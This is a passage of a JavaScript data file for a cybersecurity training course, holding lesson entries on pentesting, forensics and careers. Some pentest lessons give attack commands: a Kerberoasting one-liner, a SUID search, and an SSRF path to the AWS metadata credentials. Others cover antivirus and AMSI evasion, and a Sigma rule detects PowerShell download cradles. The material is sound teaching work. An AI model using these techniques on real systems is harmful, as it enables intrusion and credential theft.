    tasks: ["Set up a Metasploitable VM and attack it with Metasploit", "Exploit MS17-010 EternalBlue on a vulnerable Windows VM (isolated lab)", "Practice with Meterpreter post-exploitation commands", "Lab: Use local_exploit_suggester to find privilege escalation paths"],
    resources: ["https://docs.metasploit.com/", "https://sourceforge.net/projects/metasploitable/"],
    estimatedMinutes: 90,
  },
  {
    id: 61, day: 61, title: "Privilege Escalation", category: "PenTesting", categoryColor: "#FB5607",
    theory: "After initial access, attackers escalate privileges to gain full system control.\n\nLinux PrivEsc:\n- sudo -l: Check sudo permissions\n- SUID files: find / -perm -4000 2>/dev/null\n- Writable /etc/passwd: Add root user\n- Cron jobs: Writable scripts run by root\n- PATH hijacking\n- Kernel exploits (dirty cow, overlayfs)\n\nWindows PrivEsc:\n- Token impersonation (PrintSpoofer, JuicyPotato)\n- Unquoted service paths\n- Weak service permissions\n- AlwaysInstallElevated registry key\n- SeImpersonatePrivilege abuse\n\nTools:\n- LinPEAS/WinPEAS: Automated privilege escalation checkers\n- GTFOBins: Linux binary exploitation\n- LOLBAS: Windows binary exploitation",
    tasks: ["Run LinPEAS on a Linux machine and analyze output", "Find and exploit a SUID binary using GTFOBins", "Practice Windows PrivEsc on TryHackMe (Windows PrivEsc room)", "Lab: Complete the 'privilege escalation' path on HackTheBox"],
    resources: ["https://gtfobins.github.io/", "https://github.com/carlospolop/PEASS-ng"],
    estimatedMinutes: 85,
  },
  {
    id: 62, day: 62, title: "Lateral Movement & Pivoting", category: "PenTesting", categoryColor: "#FB5607",
    theory: "After compromising one system, attackers move to other systems in the network.\n\nLateral Movement Techniques:\n- Pass-the-Hash (PtH): Use NTLM hash without cracking\n- Pass-the-Ticket: Kerberos ticket reuse\n- Overpass-the-Hash: Convert NTLM to Kerberos\n- Remote Service Execution: WMI, SMB, WinRM, PSExec\n- Credential reuse: Same password on multiple systems\n\nPivoting:\n- Use compromised host as jump point to reach isolated networks\n- SSH tunneling: ssh -D 1080 user@jump-host (SOCKS proxy)\n- Metasploit route command\n- proxychains\n- Chisel (fast TCP tunnel)\n\nActive Directory Attacks:\n- DCSync: Dump all AD hashes\n- BloodHound: AD attack path visualization",
    tasks: ["Practice Pass-the-Hash attack in an isolated lab", "Set up SSH port forwarding to access an internal service", "Use BloodHound to analyze AD attack paths", "Lab: Complete 'Lateral Movement and Pivoting' on TryHackMe"],
    resources: ["https://github.com/BloodHoundAD/BloodHound", "https://github.com/jpillora/chisel"],
    estimatedMinutes: 85,
  },
  {
    id: 63, day: 63, title: "Active Directory Attacks", category: "PenTesting", categoryColor: "#FB5607",
    theory: "Active Directory (AD) is the backbone of corporate networks. AD attacks are crucial pentest skills.\n\nKey AD Attacks:\n- AS-REP Roasting: Accounts without Kerberos pre-auth\n- Kerberoasting: Extract service ticket hashes\n- DCSync: Dump all domain hashes\n- Pass-the-Ticket: Reuse Kerberos tickets\n- Golden Ticket: Forge TGT using KRBTGT hash\n- Silver Ticket: Forge TGS for a service\n\nTools:\n- Impacket: Python-based AD attack suite\n- CrackMapExec (CME): Swiss army knife for AD\n- Rubeus: Windows-based Kerberos tools\n- Mimikatz: Credential dumping\n\nKerberoasting:\ngetUserSPNs.py domain/user:pass -dc-ip dc -outputfile hashes\nhashcat -m 13100 hashes wordlist.txt",
    tasks: ["Set up a Windows AD lab using vulnerable-AD", "Perform Kerberoasting and crack the service hashes", "Use BloodHound to find paths to Domain Admin", "Lab: Compromise a full AD environment on TryHackMe or HackTheBox"],
    resources: ["https://github.com/WazeHell/vulnerable-AD", "https://github.com/GhostPack/Rubeus"],
    estimatedMinutes: 100,
  },
  {
    id: 64, day: 64, title: "Web Application Pentesting", category: "PenTesting", categoryColor: "#FB5607",
    theory: "Web application pentesting follows a systematic approach using all the web security skills learned earlier.\n\nWeb Pentest Checklist:\n1. Information gathering (tech stack, directories, parameters)\n2. Authentication testing\n3. Authorization testing (IDOR, priv esc)\n4. Session management\n5. Input validation (SQLi, XSS, command injection)\n6. Business logic flaws\n7. API security testing\n8. Error handling\n9. Cryptography\n10. Third-party components\n\nTools:\n- Burp Suite Pro (paid) or Community\n- OWASP ZAP (free)\n- SQLmap, XSSer\n- ffuf for fuzzing\n\nMethodology: OWASP Testing Guide v4.2",
    tasks: ["Complete a web machine on HackTheBox (e.g., BountyHunter or Validation)", "Use Burp Suite to spider and scan a web application", "Write a web pentest report for your findings", "Lab: Complete PortSwigger's SQL injection and XSS labs"],
    resources: ["https://owasp.org/www-project-web-security-testing-guide/"],
    estimatedMinutes: 90,
  },
  {
    id: 65, day: 65, title: "Vulnerability Scanning", category: "PenTesting", categoryColor: "#FB5607",
    theory: "Vulnerability scanners automate the process of finding known vulnerabilities across systems.\n\nTools:\n- Nessus: Industry standard (free for home use)\n- OpenVAS/Greenbone: Open source alternative\n- Qualys: Enterprise cloud scanner\n- Nuclei: Template-based scanner (community templates)\n\nNuclei Usage:\nnuclei -u https://target.com -t cves/\nnuclei -l urls.txt -t technologies/\nnuclei -u target.com -t misconfigurations/\n\nVulnerability Prioritization:\n- CVSSv3 score: 0-10 (Critical: 9-10)\n- CVSS metrics: Attack Vector, Complexity, Privileges, Impact\n- Consider exploitability, business impact, remediation effort\n\nFalse Positives: Always manually verify scanner findings!",
    tasks: ["Install OpenVAS and scan your lab environment", "Use Nuclei to scan a practice target: nuclei -u http://target", "Install Nessus Essentials (free) and run a basic scan", "Lab: Prioritize a list of 10 fake CVEs by severity and exploitability"],
    resources: ["https://github.com/projectdiscovery/nuclei", "https://www.tenable.com/products/nessus/nessus-essentials"],
    estimatedMinutes: 70,
  },
  {
    id: 66, day: 66, title: "Evasion & Antivirus Bypass", category: "PenTesting", categoryColor: "#FB5607",
    theory: "Understanding evasion helps both attackers and defenders improve detection capabilities.\n\nAV Detection Methods:\n- Signature-based: Match known malicious patterns\n- Heuristic: Analyze suspicious behavior\n- Behavioral: Monitor runtime behavior\n- Cloud-based: Upload for analysis\n\nEvasion Techniques:\n- Obfuscation: Change code structure\n- Encoding/Encryption: Encode payload\n- Packers: Compress and encrypt executables\n- Process Injection: Inject into legitimate processes\n- Living off the Land (LOTL): Use built-in tools (PowerShell, WMI, certutil)\n- Fileless: Run only in memory\n\nTools for Red Team:\n- Veil Framework: AV bypass tool\n- Shellter: PE injection tool\n- Donut: Generate position-independent shellcode\n\nDefense: Behavioral monitoring > Signature scanning",
    tasks: ["Generate a payload with msfvenom and check it on VirusTotal", "Research how PowerShell AMSI bypass works", "Study a living-off-the-land attack (LOLBAS binaries)", "Lab: Practice AMSI bypass techniques in a test environment"],
    resources: ["https://lolbas-project.github.io/", "https://github.com/Veil-Framework/Veil"],
    estimatedMinutes: 75,
  },
  {
    id: 67, day: 67, title: "Cloud Security Basics", category: "PenTesting", categoryColor: "#FB5607",
    theory: "Cloud environments introduce new attack surfaces. Cloud pentesting is a growing and lucrative specialization.\n\nAWS Security:\n- IAM: Users, roles, policies, principle of least privilege\n- S3: Public buckets, ACLs, bucket policies\n- EC2: Security groups, metadata service (IMDS)\n- Lambda: Serverless, function code security\n\nCommon Cloud Misconfigs:\n- Public S3 buckets with sensitive data\n- Over-privileged IAM roles\n- Exposed metadata service\n- Unrestricted security groups\n\nAWS Attack: SSRF → http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\nTools:\n- Pacu: AWS exploitation framework\n- ScoutSuite: Cloud security auditing\n- CloudSploit: Cloud security scanning",
    tasks: ["Create a free AWS account and review IAM best practices", "Use ScoutSuite to audit an AWS environment (can use a demo)", "Research the Capital One breach (SSRF → cloud metadata)", "Lab: Try the flaws.cloud or CloudGoat intentionally vulnerable AWS environments"],
    resources: ["https://flaws.cloud/", "https://github.com/RhinoSecurityLabs/cloudgoat"],
    estimatedMinutes: 75,
  },
  {
    id: 68, day: 68, title: "Mobile Application Security", category: "PenTesting", categoryColor: "#FB5607",
    theory: "Mobile apps have a growing attack surface. OWASP Mobile Top 10 covers the main risks.\n\nOWASP Mobile Top 10:\nM1: Improper Credential Usage\nM2: Inadequate Supply Chain Security\nM3: Insecure Authentication/Authorization\nM4: Insufficient Input/Output Validation\nM5: Insecure Communication\nM6: Inadequate Privacy Controls\nM7: Insufficient Binary Protections\nM8: Security Misconfiguration\nM9: Insecure Data Storage\nM10: Insufficient Cryptography\n\nAndroid Testing:\n- APK analysis: jadx, apktool (reverse engineering)\n- adb (Android Debug Bridge) commands\n- MobSF: Automated mobile security framework\n\nInsecure Data Storage:\nLogcat logs, SharedPreferences, SQLite, external storage",
    tasks: ["Install MobSF and analyze an Android APK", "Use jadx to decompile an APK and look for hardcoded secrets", "Connect to an Android emulator with adb and explore the filesystem", "Lab: Test an intentionally vulnerable Android app (DIVA, InsecureBankv2)"],
    resources: ["https://github.com/MobSF/Mobile-Security-Framework-MobSF", "https://github.com/dineshshetty/Android-InsecureBankv2"],
    estimatedMinutes: 75,
  },
  {
    id: 69, day: 69, title: "Report Writing", category: "PenTesting", categoryColor: "#FB5607",
    theory: "A pentest report is your deliverable. A good report clearly communicates findings to both technical and executive audiences.\n\nReport Structure:\n1. Executive Summary: High-level findings for management\n2. Scope and Methodology: What was tested, how\n3. Risk Rating Summary: Critical/High/Medium/Low counts\n4. Detailed Findings:\n   - Title, CVSSv3 score, description\n   - Evidence (screenshots, PoC)\n   - Remediation steps\n5. Appendices: Tools used, raw output\n\nFinding Template:\n- Title: SQL Injection in Login Form\n- Severity: Critical (CVSSv3: 9.8)\n- Description: User input is directly concatenated...\n- Impact: Full database dump, authentication bypass\n- PoC: [payload and screenshot]\n- Remediation: Use parameterized queries...\n- References: CWE-89, OWASP-A03",
    tasks: ["Write a pentest report for the last 5 vulnerabilities you found", "Read a sample public pentest report (many security firms publish them)", "Create a vulnerability template you can reuse for all findings", "Lab: Grade a sample report — what's missing? What's good?"],
    resources: ["https://github.com/juliocesarfort/public-pentesting-reports"],
    estimatedMinutes: 75,
  },
  {
    id: 70, day: 70, title: "PenTest Review & HTB Machine", category: "PenTesting", categoryColor: "#FB5607",
    theory: "Excellent work completing the Penetration Testing module!\n\nYou've covered:\n✓ Pentest methodology\n✓ Passive and active reconnaissance\n✓ Metasploit Framework\n✓ Privilege escalation (Linux & Windows)\n✓ Lateral movement and pivoting\n✓ Active Directory attacks\n✓ Web application pentesting\n✓ Vulnerability scanning\n✓ Evasion techniques\n✓ Cloud security\n✓ Mobile security\n✓ Report writing\n\nThis is the core skill set for a professional penetration tester. Keep practicing!",
    tasks: ["Complete a full medium-difficulty HackTheBox machine from scratch", "Write a complete professional pentest report for that machine", "Attempt a retired OSCP-style machine on PG Practice (Offensive Security)", "Share your writeup on a blog or GitHub"],
    resources: ["https://www.hackthebox.com/", "https://www.offensive-security.com/labs/individual/"],
    estimatedMinutes: 180,
  },

  // === FORENSICS ===
  {
    id: 71, day: 71, title: "Digital Forensics Fundamentals", category: "Forensics", categoryColor: "#8338EC",
    theory: "Digital forensics is the process of collecting, analyzing, and preserving digital evidence.\n\nForensics Principles:\n- Chain of Custody: Document every step\n- Data Integrity: Verify with hashes\n- Non-Destructive: Work on copies, not originals\n- Documentation: Record everything\n\nForensics Types:\n- Disk Forensics: Examine storage media\n- Memory Forensics: Analyze RAM\n- Network Forensics: Analyze traffic\n- Mobile Forensics: Examine mobile devices\n- Log Forensics: Analyze event logs\n\nKey Concepts:\n- Forensic image: Bit-for-bit copy\n- MD5/SHA256 verification\n- Write blocker: Prevent modifying evidence\n- Timeline analysis\n\nTools: Autopsy, FTK, Volatility, Wireshark, Sleuth Kit",
    tasks: ["Create a forensic image of a USB drive using dd: dd if=/dev/sdb of=image.dd", "Verify image integrity with md5sum and sha256sum", "Research chain of custody and why it matters in court", "Lab: Download a forensic challenge image from CyberDefenders and analyze it"],
    resources: ["https://cyberdefenders.org/", "https://dfir.training/"],
    estimatedMinutes: 60,
  },
  {
    id: 72, day: 72, title: "Disk Forensics & File Recovery", category: "Forensics", categoryColor: "#8338EC",
    theory: "Disk forensics involves analyzing storage media to recover data and evidence.\n\nFile Systems:\n- NTFS (Windows): MFT, $Recycle.Bin, NTFS streams\n- ext4 (Linux): inodes, journal\n- FAT32: Simple, used in USB drives\n\nDeleted File Recovery:\n- Files 'deleted' just have metadata cleared\n- Data remains until overwritten\n- Tools: Autopsy, PhotoRec, extundelete\n\nRegistry Analysis (Windows):\n- HKEY_CURRENT_USER: User settings\n- HKEY_LOCAL_MACHINE: System settings\n- Recent files: NTUSER.DAT/Software/Microsoft/Windows/CurrentVersion/Explorer/RecentDocs\n- USB devices: SYSTEM/CurrentControlSet/Enum/USBSTOR\n\nArtifacts:\n- Prefetch files (.pf)\n- Jump lists\n- LNK files (shortcuts)\n- Windows event logs",
    tasks: ["Use Autopsy to analyze a disk image from a CTF challenge", "Recover deleted files from a test image using PhotoRec", "Analyze Windows registry hives for evidence of file access", "Lab: Complete a disk forensics challenge on CyberDefenders"],
    resources: ["https://www.autopsy.com/", "https://www.cgsecurity.org/wiki/PhotoRec"],
    estimatedMinutes: 70,
  },
  {
    id: 73, day: 73, title: "Memory Forensics with Volatility", category: "Forensics", categoryColor: "#8338EC",
    theory: "Memory forensics is essential for detecting fileless malware and advanced threats.\n\nVolatility 3 Common Plugins:\n- windows.pslist: List processes\n- windows.pstree: Process tree\n- windows.netscan: Network connections\n- windows.cmdline: Process command lines\n- windows.dlllist: Loaded DLLs\n- windows.filescan: Open file handles\n- windows.malfind: Find injected code\n- windows.hashdump: Dump password hashes\n\nAnalysis Workflow:\n1. windows.info — get OS version\n2. windows.pslist — identify suspicious processes\n3. windows.netscan — check network connections\n4. windows.malfind — find code injection\n5. windows.dumpfiles — extract suspicious files\n\nFileless Malware: Lives in memory, no disk artifacts. Memory is the only place to find it.",
    tasks: ["Download a memory image from MemLabs or CyberDefenders", "Run windows.pslist and identify any suspicious processes", "Use windows.malfind to look for injected code", "Lab: Complete MemLabs challenge series"],
    resources: ["https://github.com/volatilityfoundation/volatility3", "https://github.com/stuxnet999/MemLabs"],
    estimatedMinutes: 80,
  },
  {
    id: 74, day: 74, title: "Network Forensics & PCAP Analysis", category: "Forensics", categoryColor: "#8338EC",
    theory: "Network forensics involves capturing and analyzing network traffic to investigate incidents.\n\nPCAP Analysis Tools:\n- Wireshark: GUI packet analysis\n- tcpdump: CLI capture and analysis\n- NetworkMiner: Extract files, credentials from PCAP\n- Zeek: High-level protocol analysis\n- Suricata: IDS/IPS with PCAP replay\n\nAnalysis Techniques:\n- Follow TCP Stream: Reconstruct conversations\n- Export Objects: Extract files from HTTP/FTP/SMB\n- Statistics > Protocol Hierarchy: See protocols\n- Conversations: Top talkers\n\nMalware Traffic Analysis:\n- Look for C2 beaconing (regular intervals)\n- DNS queries to DGA domains\n- Large data exfiltration\n- Unusual protocols on standard ports\n- Self-signed certificates",
    tasks: ["Download a malicious traffic PCAP from malware-traffic-analysis.net", "Extract malware samples from the PCAP using NetworkMiner or Wireshark", "Identify C2 communication patterns in the traffic", "Lab: Complete a network forensics challenge on CyberDefenders"],
    resources: ["https://www.malware-traffic-analysis.net/", "https://www.netresec.com/?page=NetworkMiner"],
    estimatedMinutes: 75,
  },
  {
    id: 75, day: 75, title: "Malware Analysis — Static", category: "Forensics", categoryColor: "#8338EC",
    theory: "Malware analysis determines what malicious software does and how to detect/remove it.\n\nStatic Analysis (no execution):\n- File type identification: file command, magic bytes\n- String extraction: strings malware.exe\n- Hash check: md5sum, VirusTotal\n- PE analysis: pefile, peframe, PE-bear\n- Import analysis: What APIs does it use?\n- Packer detection: Exeinfo PE, PEiD\n- Disassembly: IDA Pro, Ghidra (free)\n- Decompilation: Hex-Rays, Binary Ninja\n\nCommon Malicious Imports:\n- CreateRemoteThread: Process injection\n- VirtualAllocEx: Memory allocation in remote process\n- WriteProcessMemory: Write to remote process\n- URLDownloadToFile: Download file\n- RegSetValueEx: Registry persistence",
    tasks: ["Install Ghidra and analyze a simple malware sample", "Extract strings from a malware sample and identify IOCs", "Check PE imports and identify suspicious API calls", "Lab: Analyze a malware sample from theZoo repository (in isolated VM)"],
    resources: ["https://ghidra-sre.org/", "https://github.com/ytisf/theZoo"],
    estimatedMinutes: 85,
  },
  {
    id: 76, day: 76, title: "Malware Analysis — Dynamic", category: "Forensics", categoryColor: "#8338EC",
    theory: "Dynamic analysis involves running malware in a controlled environment to observe behavior.\n\nSandbox Setup:\n- Use isolated VM (no network or host-only network)\n- Take snapshots before running malware\n- Use Windows 7/10 VM (most malware targets Windows)\n\nMonitoring Tools:\n- Process Monitor (ProcMon): File/registry/network activity\n- Process Hacker: Process inspection\n- Wireshark: Network traffic\n- Regshot: Registry changes\n- API Monitor: API calls\n\nOnline Sandboxes:\n- any.run: Interactive sandbox\n- Joe Sandbox: Automated analysis\n- Hybrid-Analysis: Free sandbox\n- VirusTotal: Basic analysis\n\nBehavioral Indicators:\n- Dropped files, registry modifications\n- Network connections (C2 beaconing)\n- Process injection, spawned processes",
    tasks: ["Set up a Windows malware analysis VM (FlareVM)", "Submit a safe malware sample to any.run and analyze the report", "Use ProcMon to monitor a sample's file system activity", "Lab: Analyze a ransomware sample's behavior in a sandbox"],
    resources: ["https://app.any.run/", "https://www.hybrid-analysis.com/", "https://github.com/mandiant/flare-vm"],
    estimatedMinutes: 90,
  },
  {
    id: 77, day: 77, title: "Incident Response", category: "Forensics", categoryColor: "#8338EC",
    theory: "Incident Response (IR) is the structured approach to handling cybersecurity incidents.\n\nIR Phases (NIST):\n1. Preparation: Policies, playbooks, tools ready\n2. Detection & Analysis: Identify incidents, assess severity\n3. Containment: Limit damage (short-term & long-term)\n4. Eradication: Remove threat from environment\n5. Recovery: Restore systems to normal operation\n6. Post-Incident: Lessons learned, improve defenses\n\nContainment Strategies:\n- Network isolation\n- Account disablement\n- DNS sinkholing\n- Firewall blocks\n\nEvidence Collection: Follow forensics principles\n\nPlaybooks: Pre-written response plans for common scenarios\n(Ransomware, Data Breach, Phishing, DDoS, Insider Threat)",
    tasks: ["Write an incident response playbook for a ransomware attack", "Practice IR in a tabletop exercise with friends or colleagues", "Research the SolarWinds breach IR response", "Lab: Complete an incident response challenge on CyberDefenders"],
    resources: ["https://cyberdefenders.org/", "https://www.cisa.gov/incident-response"],
    estimatedMinutes: 70,
  },
  {
    id: 78, day: 78, title: "Threat Hunting", category: "Forensics", categoryColor: "#8338EC",
    theory: "Threat hunting is the proactive search for threats that have evaded detection.\n\nThreat Hunting vs SOC:\n- SOC: Reactive (responds to alerts)\n- Threat Hunting: Proactive (assumes breach)\n\nHunting Methodology:\n1. Hypothesis: \"Attackers might be using PowerShell for lateral movement\"\n2. Hunt: Search logs for PowerShell encoded commands\n3. Investigate: Analyze findings, correlate data\n4. Respond: Escalate confirmed findings\n5. Improve: Update detection rules based on findings\n\nHunt Data Sources:\n- Windows Event Logs (Sysmon)\n- EDR telemetry\n- Network logs (DNS, proxy, firewall)\n- Authentication logs\n\nMITRE ATT&CK: Framework for mapping TTPs (Tactics, Techniques, Procedures)",
    tasks: ["Study MITRE ATT&CK framework: attack.mitre.org", "Install Sysmon and analyze the logs it generates", "Write a threat hunt hypothesis for a common TTP (e.g., T1059 Command Execution)", "Lab: Complete a threat hunting challenge on CyberDefenders"],
    resources: ["https://attack.mitre.org/", "https://github.com/SwiftOnSecurity/sysmon-config"],
    estimatedMinutes: 75,
  },
  {
    id: 79, day: 79, title: "OSINT for Investigations", category: "Forensics", categoryColor: "#8338EC",
    theory: "OSINT (Open Source Intelligence) uses publicly available information for investigations.\n\nOSINT Investigation Types:\n- Threat actor profiling\n- Corporate intelligence\n- Missing persons (law enforcement)\n- Brand protection\n- Due diligence\n\nKey OSINT Techniques:\n- Reverse image search (Google, TinEye, Yandex)\n- Social media analysis\n- Domain/IP research (WHOIS, Shodan)\n- Username investigation (Sherlock)\n- Geolocation from images (EXIF, visual clues)\n- Wayback Machine for historical data\n\nTools:\n- Maltego: Visual link analysis\n- Shodan: Device search engine\n- SpiderFoot: Automated OSINT\n- Recon-ng: Modular OSINT\n- OSINT Framework: osintframework.com\n\nEthics: OSINT investigations must respect privacy and legal boundaries",
    tasks: ["Use Sherlock to find accounts linked to a username: python3 sherlock username", "Perform a reverse image search to find the source of an image", "Research a company's digital footprint using only public sources", "Lab: Complete a beginner OSINT challenge on TraceLabs or CTF events"],
    resources: ["https://osintframework.com/", "https://github.com/sherlock-project/sherlock"],
    estimatedMinutes: 65,
  },
  {
    id: 80, day: 80, title: "Reverse Engineering Basics", category: "Forensics", categoryColor: "#8338EC",
    theory: "Reverse engineering is the process of analyzing software to understand its function without source code.\n\nConcepts:\n- Assembly language: Low-level language CPUs execute\n- Disassembly: Machine code → Assembly\n- Decompilation: Binary → High-level language\n\nKey Assembly (x86-64):\n- Registers: RAX, RBX, RCX, RDX, RSP, RBP, RSI, RDI\n- Instructions: MOV, ADD, SUB, PUSH, POP, CALL, RET, JMP, CMP\n- Stack: PUSH/POP, function calls\n\nTools:\n- Ghidra (free): NSA-developed RE tool\n- IDA Pro: Industry standard (expensive)\n- Binary Ninja: Modern RE platform\n- x64dbg: Windows debugger\n- gdb: Linux debugger\n- pwndbg: gdb plugin for exploit development",
    tasks: ["Install Ghidra and analyze a simple CTF binary", "Use gdb to debug a simple C program", "Complete a beginner crackme challenge (reversing.kr, crackmes.one)", "Lab: Use Ghidra to find a hardcoded password in a binary"],
    resources: ["https://ghidra-sre.org/", "https://crackmes.one/"],
    estimatedMinutes: 90,
  },
  {
    id: 81, day: 81, title: "Binary Exploitation Intro", category: "Forensics", categoryColor: "#8338EC",
    theory: "Binary exploitation involves finding and exploiting vulnerabilities in compiled programs.\n\nCommon Vulnerabilities:\n- Buffer Overflow: Write past buffer boundaries\n- Stack Overflow: Overwrite return address\n- Format String: Uncontrolled printf(user_input)\n- Use-After-Free: Access freed memory\n- Integer Overflow: Arithmetic exceeds type bounds\n\nBuffer Overflow Steps:\n1. Find buffer length\n2. Overwrite EIP/RIP (return address)\n3. Point to shellcode or gadgets\n\nProtections:\n- ASLR: Randomize memory layout\n- NX/DEP: Non-executable stack\n- Stack Canaries: Detect overflow\n- PIE: Position-independent executable\n\nTools:\n- pwntools: Python exploit framework\n- pwndbg: Enhanced GDB for exploitation\n- ROPgadget: Find ROP gadgets",
    tasks: ["Read 'Buffer Overflow for Beginners' on PicoCTF or PWN.college", "Complete a basic buffer overflow CTF challenge", "Learn to use pwntools for exploit development", "Lab: Exploit a vulnerable binary on pwn.college or exploit.education"],
    resources: ["https://pwn.college/", "https://github.com/Gallopsled/pwntools"],
    estimatedMinutes: 90,
  },
  {
    id: 82, day: 82, title: "SIEM & Detection Engineering", category: "Forensics", categoryColor: "#8338EC",
    theory: "Detection engineering builds the rules and logic that power security monitoring.\n\nSIEM Platforms:\n- Splunk: Industry leader\n- Microsoft Sentinel: Cloud-native\n- Elastic SIEM: Open source\n- IBM QRadar: Enterprise\n\nSigma Rules:\n- Vendor-agnostic detection rule format\n- Convert to Splunk, ELK, QRadar queries\n- sigma-cli to convert\n\nExample Sigma Rule:\n---\ntitle: Suspicious PowerShell Download\ndetection:\n  selection:\n    EventID: 4688\n    CommandLine|contains:\n      - 'DownloadString'\n      - 'IEX'\n  condition: selection\n---\n\nMITRE ATT&CK Integration:\n- Map alerts to ATT&CK techniques\n- Coverage matrix: What TTPs can you detect?\n- Detection-as-code (DaC)",
    tasks: ["Write 3 Sigma rules for common attack techniques", "Set up Elastic SIEM and import Sigma rules", "Map your detections to MITRE ATT&CK techniques", "Lab: Complete a threat detection challenge on CyberDefenders"],
    resources: ["https://github.com/SigmaHQ/sigma", "https://www.elastic.co/security"],
    estimatedMinutes: 80,
  },
  {
    id: 83, day: 83, title: "Threat Modeling", category: "Forensics", categoryColor: "#8338EC",
    theory: "Threat modeling is a proactive process to identify and address security risks before they're exploited.\n\nThreat Modeling Methodologies:\n- STRIDE: Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation of Privilege\n- PASTA: Process for Attack Simulation and Threat Analysis\n- DREAD: Damage, Reproducibility, Exploitability, Affected Users, Discoverability\n- MITRE ATT&CK: Real-world adversary TTPs\n\nThreat Modeling Process (STRIDE):\n1. Diagram your system (DFD - Data Flow Diagram)\n2. Identify assets\n3. Apply STRIDE to each component\n4. Rate risks (likelihood × impact)\n5. Define mitigations\n6. Track and verify mitigations\n\nTools:\n- Microsoft Threat Modeling Tool (free)\n- OWASP Threat Dragon\n- draw.io for DFDs",
    tasks: ["Create a threat model for a simple web application using STRIDE", "Use OWASP Threat Dragon to create a DFD", "Identify 10 threats for a login system and rate their severity", "Research: What is the Microsoft SDL (Security Development Lifecycle)?"],
    resources: ["https://owasp.org/www-project-threat-dragon/", "https://www.microsoft.com/en-us/securityengineering/sdl"],
    estimatedMinutes: 65,
  },
  {
    id: 84, day: 84, title: "Forensics Module Review & CTF", category: "Forensics", categoryColor: "#8338EC",
    theory: "Outstanding! You've completed the Forensics & Advanced module!\n\nYou've covered:\n✓ Digital forensics fundamentals\n✓ Disk forensics and file recovery\n✓ Memory forensics with Volatility\n✓ Network forensics and PCAP analysis\n✓ Malware analysis (static & dynamic)\n✓ Incident response\n✓ Threat hunting\n✓ OSINT for investigations\n✓ Reverse engineering basics\n✓ Binary exploitation intro\n✓ SIEM and detection engineering\n✓ Threat modeling\n\nYou now have a comprehensive blue team skill set!",
    tasks: ["Complete a full incident response simulation on CyberDefenders", "Participate in a CTF event (CTFtime.org has a calendar)", "Write a blog post about a forensics technique you learned", "Challenge: Complete a full forensics competition case from start to report"],
    resources: ["https://ctftime.org/", "https://cyberdefenders.org/"],
    estimatedMinutes: 120,
  },

  // === CAREER ===
  {
    id: 85, day: 85, title: "Cybersecurity Certifications", category: "Career", categoryColor: "#00FF00",
    theory: "Certifications validate your skills and open doors in the cybersecurity industry.\n\nEntry Level:\n- CompTIA Security+: Most recognized entry cert\n- CompTIA Network+: Networking foundation\n- Google Cybersecurity Certificate: Quick starter\n- Microsoft SC-900: Security fundamentals\n\nIntermediate:\n- CEH (Certified Ethical Hacker): Well-known, somewhat theory-heavy\n- CompTIA PenTest+: Intermediate pentesting\n- AWS Security Specialty: Cloud security\n\nAdvanced (High Value):\n- OSCP (Offensive Security): Gold standard for pentesting\n- CISSP: Senior security management\n- CISM: Management focus\n- GIAC certs (GWAPT, GPEN, GCIH): Technical, highly respected\n\nPractical vs. Multiple Choice:\n- OSCP, GIAC: Hands-on exams (more valuable to employers)\n- CEH, Security+: Multiple choice",
    tasks: ["Identify which certification aligns with your career goals", "Create a 6-month study plan for your target certification", "Join r/CompTIA or r/netsecstudents for study resources", "Practice: Take a free Security+ practice test online"],
    resources: ["https://www.comptia.org/", "https://www.offensive-security.com/pwk-oscp/"],
    estimatedMinutes: 45,
  },
  {
    id: 86, day: 86, title: "Career Paths in Cybersecurity", category: "Career", categoryColor: "#00FF00",
    theory: "Cybersecurity offers diverse career paths with different focuses and skillsets.\n\nRed Team (Offensive):\n- Penetration Tester\n- Red Team Operator\n- Bug Bounty Hunter\n- Vulnerability Researcher\n- Exploit Developer\n\nBlue Team (Defensive):\n- SOC Analyst (L1/L2/L3)\n- Incident Responder\n- Threat Hunter\n- Detection Engineer\n- DFIR Analyst\n\nGRC (Governance, Risk, Compliance):\n- Compliance Analyst\n- Risk Manager\n- Security Auditor\n- CISO\n\nSpecializations:\n- Cloud Security Engineer\n- Application Security (AppSec)\n- Malware Researcher\n- Forensics Analyst\n- Cryptographer\n\nSalaries: $70K-$200K+ depending on role and experience",
    tasks: ["Research job postings for 3 different security roles you find interesting", "Identify skills gaps between your current skills and a target role", "Connect with 3 security professionals on LinkedIn for informational interviews", "Write a 1-year career plan with specific milestones"],
    resources: ["https://www.cyberseek.org/pathway.html", "https://www.isc2.org/"],
    estimatedMinutes: 45,
  },
  {
    id: 87, day: 87, title: "Building Your Portfolio", category: "Career", categoryColor: "#00FF00",
    theory: "A strong portfolio demonstrates practical skills better than any certification.\n\nPortfolio Components:\n1. GitHub Profile: Security tools, scripts, CTF writeups\n2. Blog: Document your learning journey, tool breakdowns\n3. CTF Writeups: Detailed solutions to CTF challenges\n4. Home Lab Documentation: Your lab setup and experiments\n5. Open Source Contributions: Contribute to security tools\n6. LinkedIn: Professional presence, skills endorsements\n\nContent Ideas:\n- Weekly learning posts\n- Tool reviews and comparisons\n- Vulnerability explanations with PoC\n- Lab walkthroughs (use retired HTB machines)\n- Security concept explainers\n\nPlatforms:\n- GitHub Pages or Hashnode (free blog)\n- LinkedIn articles\n- Medium (security community reads it)\n- YouTube (video walkthroughs)",
    tasks: ["Create a GitHub profile README showcasing your security projects", "Write your first security blog post (technical or career-focused)", "Document and publish 3 CTF writeups", "Lab: Contribute a documentation improvement to an open-source security project"],
    resources: ["https://pages.github.com/", "https://hashnode.com/"],
    estimatedMinutes: 60,
  },
  {
    id: 88, day: 88, title: "Interview Preparation", category: "Career", categoryColor: "#00FF00",
    theory: "Cybersecurity interviews test technical knowledge, problem-solving, and communication skills.\n\nCommon Interview Topics:\n\nNetworking:\n- What happens when you type google.com?\n- Explain TCP handshake, OSI model\n- Difference between IDS and IPS\n\nSecurity Concepts:\n- CIA Triad (Confidentiality, Integrity, Availability)\n- Difference between authentication and authorization\n- What is a buffer overflow?\n\nDefensive:\n- How would you respond to ransomware?\n- Walk me through an incident response\n- What's in your SIEM dashboard?\n\nOffensive:\n- How does SQL injection work?\n- What's the first thing you do after gaining access?\n\nBehavioral:\n- Explain a complex security concept simply\n- Describe a challenging problem you solved\n- Ethics questions",
    tasks: ["Answer: 'What happens when you type google.com in a browser?' (full technical answer)", "Practice explaining the CIA triad to a non-technical person", "Do a mock interview with a friend or use Pramp/Interviewing.io", "Write answers to 10 common security interview questions"],
    resources: ["https://danielmiessler.com/p/infosec-interview-questions/"],
